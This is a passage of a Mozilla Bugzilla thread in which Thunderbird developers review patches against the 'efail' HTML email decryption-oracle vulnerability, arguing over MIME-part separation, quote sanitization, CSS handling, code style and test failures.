We can't allow these kinds of bugs to continue. This is not the first, I remember we had a similar bug not too long ago where stuff ran only on reply and caused a security problem. That one was not about encryption.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 69](/show_bug.cgi?id=1419417#c69)• 7 years ago |
|  | |

Attached patch

[Separate MIME parts from each other (for 52)](attachment.cgi?id=8976074&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976074&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976074)

This implements a new MIME class that is now used for normal HTML parts (unless you use the sanitizer). It takes the HTML source text, runs it through the Geclp HTML parser, and then immediately serializes it out again. That ensures that all tags and attributes are closed and the HTML is syntactically correct.
This happens for every MIME part with HTML. This should fix the main bug here.
I've been working on this all night long.
Thanks to smaug for lots of help with the DOM APIs. Main problem is that many APIs are now removed. Indeed, the DOM Parser API is also removed, but there's a replacement API in 61, I've noted that as comment in the code. This patch is for 52 and should also work more or less for 60.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 70](/show_bug.cgi?id=1419417#c70)• 7 years ago |
|  | |

Can you start a try run?

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 71](/show_bug.cgi?id=1419417#c71)• 7 years ago |
|  | |

Attached patch

[Sanitizer code cleanup](attachment.cgi?id=8976085&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976085&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976085)

This cleans up the Sanitizer class code a little bit.
Not related to the bug at all. But found while I was working on the previous patch. I separated it for ease of review.
[Attachment #8976085](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") -
Flags: review?(mkmelin+mozilla)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15195308_22599)• 7 years ago |

[Attachment #8976074](/attachment.cgi?id=8976074&action=edit "Separate MIME parts from each other (for 52)") -
Flags: review?(mkmelin+mozilla)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 72](/show_bug.cgi?id=1419417#c72)• 7 years ago |
|  | |

Attached patch

[Sanitize quoted HTML, v3](attachment.cgi?id=8976086&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976086&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976086)

[Attachment #8976050](/attachment.cgi?id=8976050&action=edit "Sanitize quoted HTML") -
Attachment is obsolete: true
[Attachment #8976054](/attachment.cgi?id=8976054&action=edit "Sanitize quoted HTML (cleaned-up)") -
Attachment is obsolete: true

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 73](/show_bug.cgi?id=1419417#c73)• 7 years ago |
|  | |

Comment on [attachment 8976085](/attachment.cgi?id=8976085 "Sanitizer code cleanup") [[details]](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") [[diff]](/attachment.cgi?id=8976085&action=diff "Sanitizer code cleanup") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976085)
Sanitizer code cleanup
1. I removed the pref migration code, because that migration happened in 2012 and it should be long done. Even then, it only concerned users who had manually modified that pref. I think that was only a dozen users world-wide even back then, so that's surely useless code now.
2. Removed my debug code
3. Renamed one variable to be clearer
4. Moved the comment from the header to the implemetation file.
5. If you allow presentational stuff, then also allow CSS. That's the only logic change here. The change only affects users who manually changed this hidden pref. Again, only a handful users, probably.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 74](/show_bug.cgi?id=1419417#c74)• 7 years ago |
|  | |

Comment on [attachment 8976086](/attachment.cgi?id=8976086 "Sanitize quoted HTML, v3") [[details]](/attachment.cgi?id=8976086&action=edit "Sanitize quoted HTML, v3") [[diff]](/attachment.cgi?id=8976086&action=diff "Sanitize quoted HTML, v3") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976086)
Sanitize quoted HTML, v3
Why are you attaching this again? I had already attached the very same patch but with a commit message in [attachment 8976054](/attachment.cgi?id=8976054 "Sanitize quoted HTML (cleaned-up)") [[details]](/attachment.cgi?id=8976054&action=edit "Sanitize quoted HTML (cleaned-up)") [[diff]](/attachment.cgi?id=8976054&action=diff "Sanitize quoted HTML (cleaned-up)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976054). I thought we had agreed that this was too drastic.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 75](/show_bug.cgi?id=1419417#c75)• 7 years ago |
|  | |

Comment on [attachment 8976085](/attachment.cgi?id=8976085 "Sanitizer code cleanup") [[details]](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") [[diff]](/attachment.cgi?id=8976085&action=diff "Sanitizer code cleanup") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976085)
Sanitizer code cleanup
Thanks for the clean-up, looks good.
[Attachment #8976085](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") -
Flags: review+

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 76](/show_bug.cgi?id=1419417#c76)• 7 years ago |
|  | |

Comment on [attachment 8976074](/attachment.cgi?id=8976074 "Separate MIME parts from each other (for 52)") [[details]](/attachment.cgi?id=8976074&action=edit "Separate MIME parts from each other (for 52)") [[diff]](/attachment.cgi?id=8976074&action=diff "Separate MIME parts from each other (for 52)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976074)
Separate MIME parts from each other (for 52)
Review of [attachment 8976074](/attachment.cgi?id=8976074 "Separate MIME parts from each other (for 52)") [[details]](/attachment.cgi?id=8976074&action=edit "Separate MIME parts from each other (for 52)") [[diff]](/attachment.cgi?id=8976074&action=diff "Separate MIME parts from each other (for 52)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976074):
-----------------------------------------------------------------
::: mailnews/mime/src/mimeTextHTMLParsed.cpp
@@ +36,5 @@
> +MimeDefClass(MimeInlineTextHTMLParsed, MimeInlineTextHTMLParsedClass,
> + mimeInlineTextHTMLParsedClass, &MIME\_SUPERCLASS);
> +
> +static int MimeInlineTextHTMLParsed\_parse\_line (const char \*, int32\_t,
> + MimeObject \*);
Nit: Indentation.
@@ +71,5 @@
> + I'll just dump the charset we get in the mime headers into a
> + HTML meta http-equiv.
> + XXX Not sure, if that is correct, though. \*/
> + char \*content\_type =
> + (obj->headers
Nit: That can go onto the previous line.
@@ +118,5 @@
> + nsString& rawHTML = \*(me->complete\_buffer);
> + nsString parsed;
> +
> + nsCOMPtr<nsIDOMDocument> document;
> + // in 61: RefPtr<mozilla::dom::DOMParser> parser = mozilla::dom::DOMParser::CreateWithoutGlobal(rv2); <<https://searchfox.org/comm-central/source/mailnews/import/winlivemail/nsWMUtils.cpp#143>>
Nit: This line is really too long.
Can you please prepare a patch that works on current trunk. We'll worry about the branches later.
If you want to be nice, please put:
#if 1
// Code for Gecko 61 and beyond:
RefPtr<mozilla::dom::DOMParser> parser = mozilla::dom::DOMParser::CreateWithoutGlobal(rv2);
#else
// Code for Gecjo 60 and below:
nsCOMPtr<nsIDOMParser> parser = do\_GetService(NS\_DOMPARSER\_CONTRACTID);
#endif
@@ +124,5 @@
> + nsresult rv = parser->ParseFromString(rawHTML.get(), "text/html", getter\_AddRefs(document));
> + NS\_ENSURE\_SUCCESS(rv, -1);
> +
> + nsCOMPtr<nsIDocumentEncoder> encoder = do\_CreateInstance(
> + "@mozilla.org/layout/documentEncoder;1?type=text/html");
Nit: Indentation.
@@ +138,5 @@
> + // needs the entire doc to make sense of the glibberish that people write.
> +
> + NS\_ConvertUTF16toUTF8 resultCStr(parsed);
> + status = ((MimeObjectClass\*)&MIME\_SUPERCLASS)->parse\_line(
> + resultCStr.BeginWriting(),
Nit: Indentation, perhaps the first argument fits onto the previous line, then align under it.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 77](/show_bug.cgi?id=1419417#c77)• 7 years ago |
|  | |

Comment on [attachment 8976085](/attachment.cgi?id=8976085 "Sanitizer code cleanup") [[details]](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") [[diff]](/attachment.cgi?id=8976085&action=diff "Sanitizer code cleanup") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976085)
Sanitizer code cleanup
Can you please rebase this for trunk.

|  | [Magnus Melin [:mkmelin]](/user_profile?user_id=101158) |  |
| --- | --- | --- |
| [Comment 78](/show_bug.cgi?id=1419417#c78)• 7 years ago |
|  | |

Comment on [attachment 8976085](/attachment.cgi?id=8976085 "Sanitizer code cleanup") [[details]](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") [[diff]](/attachment.cgi?id=8976085&action=diff "Sanitizer code cleanup") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976085)
Sanitizer code cleanup
Review of [attachment 8976085](/attachment.cgi?id=8976085 "Sanitizer code cleanup") [[details]](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") [[diff]](/attachment.cgi?id=8976085&action=diff "Sanitizer code cleanup") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976085):
-----------------------------------------------------------------
::: mailnews/mime/src/mimemoz2.cpp
@@ +2201,5 @@
> &dropMedia);
> if (dropPresentational)
> flags |= nsIParserUtils::SanitizerDropNonCSSPresentation;
> + else
> + flags |= nsIParserUtils::SanitizerAllowStyle;
I thought no-styles was a feature for this particular code...
[Attachment #8976085](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") -
Flags: review?(mkmelin+mozilla) → review+

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 79](/show_bug.cgi?id=1419417#c79)• 7 years ago |
|  | |

Attached patch

[Separate MIME parts from each other (for trunk)](attachment.cgi?id=8976330&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976330&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976330)

Ben, can you please provide patches that compile on trunk. I've fixed this and I also addressed the style nits.
I've also included the code for TB 60 and below (untested).
[Attachment #8976074](/attachment.cgi?id=8976074&action=edit "Separate MIME parts from each other (for 52)") -
Attachment is obsolete: true
[Attachment #8976074](/attachment.cgi?id=8976074&action=edit "Separate MIME parts from each other (for 52)") -
Flags: review?(mkmelin+mozilla)
[Attachment #8976330](/attachment.cgi?id=8976330&action=edit "Separate MIME parts from each other (for trunk)") -
Flags: review?(mkmelin+mozilla)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 80](/show_bug.cgi?id=1419417#c80)• 7 years ago |
|  | |

> Ben, can you please provide patches that compile on trunk.
My focus right now was TB 52.8.0, because that needs to get out the door. The APIs are different, as you are painfully aware.
(And also because Enigmail failed on trunk for me, and 60 crashed on startup.)
Thanks for the update to trunk.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15229836_22599)• 7 years ago |

[Attachment #8976074](/attachment.cgi?id=8976074&action=edit "Separate MIME parts from each other (for 52)") -
Attachment is obsolete: false

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15229875_22599)• 7 years ago |

[Attachment #8976074](/attachment.cgi?id=8976074&action=edit "Separate MIME parts from each other (for 52)") -
Attachment description: Separate MIME parts from each other → Separate MIME parts from each other (for 52)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 81](/show_bug.cgi?id=1419417#c81)• 7 years ago |
|  | |

> I thought we had agreed that this was too drastic.
You and Magnus simply stated that. I never said that I agree. Both Patrick and me think that this is the way to go.
But I had an idea: The sanitizer is drastic also on presentational HTML, which is not required for security. I can drive the sanitizer in a mode that removes all the stuff potentially problematic for security, but keep presentational HTML like tables and <font> and CSS.
How about that?

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 82](/show_bug.cgi?id=1419417#c82)• 7 years ago |
|  | |

> I thought no-styles was a feature for this particular code...
It's only a secondary feature of the sanitizer, not the primary one. There's an existing pref for it, and with this code, the style would be enabled based on that pref. See point 5 of [comment 73](/show_bug.cgi?id=1419417#c73 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"). I could rename the pref to be clearer, though, if you like?

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 83](/show_bug.cgi?id=1419417#c83)• 7 years ago |
|  | |

At least on my test e-mail ([attachment 8975458](/attachment.cgi?id=8975458 "A1-dec-pgp-smime-html-reply.eml") [[details]](/attachment.cgi?id=8975458&action=edit "A1-dec-pgp-smime-html-reply.eml")) this works well.
We certainly need to get a try run for this, so updating it to trunk, painfully, since I've done all those ports myself, even the one in nsWMUtils.cpp. In fact, I asked Boris to provide a C++ interface which was created only for use in TB and can break any minute, since there is no test for it. Someone needs to write a gtest, if we're using this now in a central location and not just some "Windows Live Mail" import. See [bug 1454842 comment #13](/show_bug.cgi?id=1454842#c13 "RESOLVED FIXED - Port bug 1453869: Replace use of nsIDOMParser").
Here's your try:
<https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&revision=19011e85f65069e35ffee58745a69f5d085b4ad2>

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 84](/show_bug.cgi?id=1419417#c84)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #81](/show_bug.cgi?id=1419417#c81 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> But I had an idea: The sanitizer is drastic also on presentational HTML,
> which is not required for security. I can drive the sanitizer in a mode that
> removes all the stuff potentially problematic for security, but keep
> presentational HTML like tables and <font> and CSS.
>
> How about that?
Is this still required? With the MIME patch I see the fully decrypted part, so I'd be pretty foolish to quote that. Why do you still need sanitising? If you do, of course it needs to be done in a way that the rendered page looks the same with and without sanitising.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 85](/show_bug.cgi?id=1419417#c85)• 7 years ago |
|  | |

Comment on [attachment 8976330](/attachment.cgi?id=8976330 "Separate MIME parts from each other (for trunk)") [[details]](/attachment.cgi?id=8976330&action=edit "Separate MIME parts from each other (for trunk)") [[diff]](/attachment.cgi?id=8976330&action=diff "Separate MIME parts from each other (for trunk)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976330)
Separate MIME parts from each other (for trunk)
>+ char \*content\_type = obj->headers ?
>+ MimeHeaders\_get(obj->headers, HEADER\_CONTENT\_TYPE, false, false) : 0;
A style nit of my own:
The notation
result = some\_long\_condition()
? if\_yes()
: otherwise();
is important for readability. Esp. so as the expressions get more complex, like here.
If it all fits in a single line |foo = works ? 1 : 0;|, that's fine, but if it's complex enough that you add a linebreak, then true and false results should be on their own lines. Much like if clauses, really.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 86](/show_bug.cgi?id=1419417#c86)• 7 years ago |
|  | |

> Why do you still need sanitising?
As a safety measure.
I am not just looking to fix this exact bug and PoC, but all bugs of this nature. That's the only way to ever get an application secure.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 87](/show_bug.cgi?id=1419417#c87)• 7 years ago |
|  | |

Attached patch

[Separate MIME parts from each other, v4 (trunk and 52)](attachment.cgi?id=8976349&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976349&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976349)

This addresses Jörg's review comments.
(NIT: If I wrap lines, I indent it 4 spaces, not just 2, to clearly distinguish from indented blocks. But on your request, I adapted it, although I find it less readable.)
Thanks, Jörg, for testing this on trunk. I incorporated your trunk changes in my patch. I've made it default to 52, so that it compiles here and so that we can land it on 52 branch, but before landing on trunk, I'd remove the TB52/to code and #ifdef.
Jörg: Given that you did the review, and tested it, can you r+ it, please?
[Attachment #8976074](/attachment.cgi?id=8976074&action=edit "Separate MIME parts from each other (for 52)") -
Attachment is obsolete: true
[Attachment #8976330](/attachment.cgi?id=8976330&action=edit "Separate MIME parts from each other (for trunk)") -
Attachment is obsolete: true
[Attachment #8976330](/attachment.cgi?id=8976330&action=edit "Separate MIME parts from each other (for trunk)") -
Flags: review?(mkmelin+mozilla)
[Attachment #8976349](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") -
Flags: review?(mkmelin+mozilla)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 88](/show_bug.cgi?id=1419417#c88)• 7 years ago |
|  | |

Attached patch

[Sanitizer code cleanup, v2](attachment.cgi?id=8976351&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976351&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976351)

[Attachment #8976351](/attachment.cgi?id=8976351&action=edit "Sanitizer code cleanup, v2") -
Flags: review?(mkmelin+mozilla)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 89](/show_bug.cgi?id=1419417#c89)• 7 years ago |
|  | |

Comment on [attachment 8976349](/attachment.cgi?id=8976349 "Separate MIME parts from each other, v4 (trunk and 52)") [[details]](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") [[diff]](/attachment.cgi?id=8976349&action=diff "Separate MIME parts from each other, v4 (trunk and 52)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976349)
Separate MIME parts from each other, v4 (trunk and 52)
Review of [attachment 8976349](/attachment.cgi?id=8976349 "Separate MIME parts from each other, v4 (trunk and 52)") [[details]](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") [[diff]](/attachment.cgi?id=8976349&action=diff "Separate MIME parts from each other, v4 (trunk and 52)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976349):
-----------------------------------------------------------------
Please fix the test failures:
<https://treeherder.mozilla.org/#/jobs?repo=try-comm-central&revision=19011e85f65069e35ffee58745a69f5d085b4ad2&selectedJob=178863090>
This can't land neither on 52 nor on 62 if it causes test failures.
::: mailnews/mime/src/mimeTextHTMLParsed.cpp
@@ +36,5 @@
> +#define MIME\_SUPERCLASS mimeInlineTextHTMLClass
> +MimeDefClass(MimeInlineTextHTMLParsed, MimeInlineTextHTMLParsedClass,
> + mimeInlineTextHTMLParsedClass, &MIME\_SUPERCLASS);
> +
> +static int MimeInlineTextHTMLParsed\_parse\_line (const char \*, int32\_t,
Please remove the space before the parenthesis, and three below.
@@ +45,5 @@
> +
> +static int
> +MimeInlineTextHTMLParsedClassInitialize(MimeInlineTextHTMLParsedClass \*clazz)
> +{
> + MimeObjectClass \*oclass = (MimeObjectClass \*) clazz;
Please remove the space after the parenthesis.
@@ +58,5 @@
> +
> +static int
> +MimeInlineTextHTMLParsed\_parse\_begin (MimeObject \*obj)
> +{
> + MimeInlineTextHTMLParsed \*me = (MimeInlineTextHTMLParsed \*) obj;
And here.
@@ +66,5 @@
> + return status;
> +
> + // charset
> + // dump the charset we get from the mime headers into a HTML <meta http-equiv>
> + char \*content\_type = (obj->headers
Lose the opening parenthesis.
@@ +68,5 @@
> + // charset
> + // dump the charset we get from the mime headers into a HTML <meta http-equiv>
> + char \*content\_type = (obj->headers
> + ? MimeHeaders\_get(obj->headers, HEADER\_CONTENT\_TYPE, false, false)
> + : 0);
Lose the closing parenthesis.
I fixed all that, but you lost the changes :-(
@@ +121,5 @@
> + mozilla::ErrorResult rv2;
> + RefPtr<mozilla::dom::DOMParser> parser =
> + mozilla::dom::DOMParser::CreateWithoutGlobal(rv2);
> + nsCOMPtr<nsIDocument> document = parser->ParseFromString(
> + rawHTML, mozilla::dom::SupportedType::Text\_html, rv2);
Please reformat to:
nsCOMPtr<nsIDocument> document =
parser->ParseFromString(rawHTML, mozilla::dom::SupportedType::Text\_html, rv2);
Which I had, but you lost :-(
@@ +134,5 @@
> +#endif
> +
> + // Serialize it back to HTML source again
> + nsCOMPtr<nsIDocumentEncoder> encoder = do\_CreateInstance(
> + "@mozilla.org/layout/documentEncoder;1?type=text/html");
Please reformat to:
nsCOMPtr<nsIDocumentEncoder> encoder =
do\_CreateInstance("@mozilla.org/layout/documentEncoder;1?type=text/html");
@@ +150,5 @@
> + return status;
> +}
> +
> +void
> +MimeInlineTextHTMLParsed\_finalize (MimeObject \*obj)
Lose space.
@@ +165,5 @@
> + ((MimeObjectClass\*)&MIME\_SUPERCLASS)->finalize (obj);
> +}
> +
> +static int
> +MimeInlineTextHTMLParsed\_parse\_line (const char \*line, int32\_t length,
Lose the space before the parenthesis.
[Attachment #8976349](/attachment.cgi?id=8976349&action=edit "Separate MIME parts from each other, v4 (trunk and 52)") -
Flags: review-

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 90](/show_bug.cgi?id=1419417#c90)• 7 years ago |
|  | |

Comment on [attachment 8976351](/attachment.cgi?id=8976351 "Sanitizer code cleanup, v2") [[details]](/attachment.cgi?id=8976351&action=edit "Sanitizer code cleanup, v2") [[diff]](/attachment.cgi?id=8976351&action=diff "Sanitizer code cleanup, v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976351)
Sanitizer code cleanup, v2
Review of [attachment 8976351](/attachment.cgi?id=8976351 "Sanitizer code cleanup, v2") [[details]](/attachment.cgi?id=8976351&action=edit "Sanitizer code cleanup, v2") [[diff]](/attachment.cgi?id=8976351&action=diff "Sanitizer code cleanup, v2") [[review]](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976351):
-----------------------------------------------------------------
::: mailnews/mailnews.js
@@ +588,5 @@
> // For the next 4 prefs, see <<http://www.bucksch.org/1/projects/mozilla/108153>>
> pref("mailnews.display.prefer\_plaintext", false); // Ignore HTML parts in multipart/alternative
> pref("mailnews.display.html\_as", 0); // How to display HTML/MIME parts. 0 = Render the sender's HTML; 1 = HTML->TXT->HTML; 2 = Show HTML source; 3 = Sanitize HTML; 4 = Show all body parts
> pref("mailnews.display.show\_all\_body\_parts\_menu", false); // Whether the View > Message body as > All body parts menu item is available
> +pref("mailnews.display.html\_sanitizer.drop\_presentational", true); // whether to drop <font>, <center>, align='...', etc.
Please don't change prefs unless you want to write migration code.
::: mailnews/mime/src/mimemoz2.cpp
@@ +2160,5 @@
> return NS\_OK;
> }
>
> +
> +
Please don't add these lines.
::: mailnews/mime/src/mimethsa.cpp
@@ +123,2 @@
>
> + // Write it out
Full stop missing.

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Comment 91](/show_bug.cgi?id=1419417#c91)• 7 years ago |
|  | |

Does the HTML sanitization work touch on the CSS issues mentioned in the efail paper at chapter 3.1, where it briefly discusses a CSS redressing attack? I want to make sure that any CSS issues there aren't slipping by the updated sanitizer for simple HTML. (I don't understand this specific aspect of the attack but it was pointed out to me.)Flags: needinfo?(ben.bucksch)

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 92](/show_bug.cgi?id=1419417#c92)• 7 years ago |
|  | |

Attached patch

[Sanitize quotes, v4 (for 52)](attachment.cgi?id=8976363&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976363&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976363)

OK, so for the quote sanitation, I have good news and bad news.
The good news is that if I enable presentational HTML and styles, the result looks the same to me as without sanitation. (There might be minor differences, but I haven't noticed any.) So, this does look like we could ship this as default for everybody. It would remove a whole class of attacks.
The bad news is that the Gecko HTML sanitizer is not able to remove URL references from CSS rules/styles. The sanitizer I had written back in 2004 could do that, but the rewrite by Henri cannot, unfortunately. He was aware of that, and that's why he has an |if| that disables all CSS (althogether, even the innocent rules), if I say that I don't want external resources.
We should later add support to remove external URLs from CSS. But right now, we have no sanitation at all and allow flat out everything, so this is no worse than before.
I've made a band-aid fix that removes that |if|. The caller can still control it, because the allowStyles has its own flag. Thunderbird and DirectorySericeProvider are the only users of this sanitizer, and all callers set AllowStyles properly, so removing that automatic is not a concrete problem, and fixes the issue The only problem is that I'd need to patch Gecko.
Anyway, the patch as attached works, and is a massive improvement over status quo. I don't see any drawbacks. I'll attach a screenshot.Flags: needinfo?(ben.bucksch)

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Comment 93](/show_bug.cgi?id=1419417#c93)• 7 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #86](/show_bug.cgi?id=1419417#c86 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> > Why do you still need sanitising?
> As a safety measure.
> I am not just looking to fix this exact bug and PoC, but all bugs of this
> nature. That's the only way to ever get an application secure.
OK, perhaps we could then lose this:
<https://hg.mozilla.org/releases/comm-esr52/rev/eec7161f761fbd8b66527d857b0657743128406f#l1.13>

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 94](/show_bug.cgi?id=1419417#c94)• 7 years ago |
|  | |

> Please don't change prefs unless you want to write migration code.
This is a hidden preference. Very few users know will use it. We change the behavior of it, and to the better (for that user group). The users who set this will immediately notice, look up, and be happy that we've made it more useful now. I don't think that effects more than a dozen users world-wide, frankly.
> Full stop missing.
Single phrases in comments don't get full stops, like in the UI. See e.g. mimemoz2.h and many other files.
> Lose the space before the parenthesis.
This is the libmime style. It's like that \*everywhere\*. I didn't change this.
> Please reformat to:
> Which I had, but you lost :-(
> I fixed all that, but you lost the changes :-(
The style matches the existing libmime code.
> Please don't add these lines.
OK, can remove them.
But I'd rather focus on the security bugs.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 95](/show_bug.cgi?id=1419417#c95)• 7 years ago |
|  | |

> OK, perhaps we could then lose this:
> <https://hg.mozilla.org/releases/comm-esr52/rev/eec7161f761fbd8b66527d857b0657743128406f#l1.13>
heh!!
Yes, hopefully, that won't be necessary. I'd like to get these fixes in, though. Then we can talk about cleanup later.
I'd like to make sure that neither this particular attack, nor any other similar one will work in the future. Once a weakness is identified, that area has a mark on its back and security researchers will use that as idea and try the attack in other ways.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 96](/show_bug.cgi?id=1419417#c96)• 7 years ago |
|  | |

(In reply to Al Billings [:abillings] from [comment #91](/show_bug.cgi?id=1419417#c91 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
> Does the HTML sanitization work touch on the CSS issues mentioned in the
> efail paper at chapter 3.1, where it briefly discusses a CSS redressing
> attack? I want to make sure that any CSS issues there aren't slipping by the
> updated sanitizer for simple HTML. (I don't understand this specific aspect
> of the attack but it was pointed out to me.)
I assume you refer to this phrase:
"... require user interaction.... in Thunderbird and Postbox we can completely redress the UI with CSS and trick the user into submitting the plaintext with an HTML form if he clicks somewhere into the message"
With "redress", I think he means to fake/mock TB UI in a message, to make the user click on it.
The mocking of UI has always been possible since images in mail exist, so that's not a bug in itself. If we do something nasty on click, that's a problem we should fix. And I think that's all they are trying to say here. I think they are solely trying to counter a hypothetical counter-argument of "Yes, it leaks confidential information, but only on user click, so it's not a problem". But we're not saying that, we're not discarding the problem, but trying to fix the problem of leaking the information in the first place, so the click itself into the message is not important. We do agree that this should not cause harm, and I think that's all they are trying to say here.
If the user clicks "Load remote content" in \*our\* UI, that's a different story. If the user does that, we can't prevent leaks, because the user specifically requested the external call. But that's not what they are talking about here.

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 97](/show_bug.cgi?id=1419417#c97)• 7 years ago |
|  | |

Attached image
[Sanitize quotes, v2 vs. v4 - Screenshots](attachment.cgi?id=8976377) (obsolete)
— [Details](attachment.cgi?id=8976377&action=edit)

This is a screenshot of:
\* 1. Viewer, Original HTML
\* 2. Composer, before (TB 58.7)
\* 3. Composer, with patch v4, sanitizer, but allowing styles
\* 4. Composer, with patch v2, full sanitation
As you can see, you see nothing :-) ...that is, no difference between 2. and 3.
That means that Sanitizer patch v4 makes no noticable changes to the quote result, even though the sanitizer ran over the quote and cleaned it from most problematic HTML.

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15265078_176914)• 7 years ago |

[Attachment #8976085](/attachment.cgi?id=8976085&action=edit "Sanitizer code cleanup") -
Attachment is obsolete: true

|  | [Jorg K (CEST = GMT+2)](/user_profile?user_id=176914)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1419417#a15265139_176914)• 7 years ago |

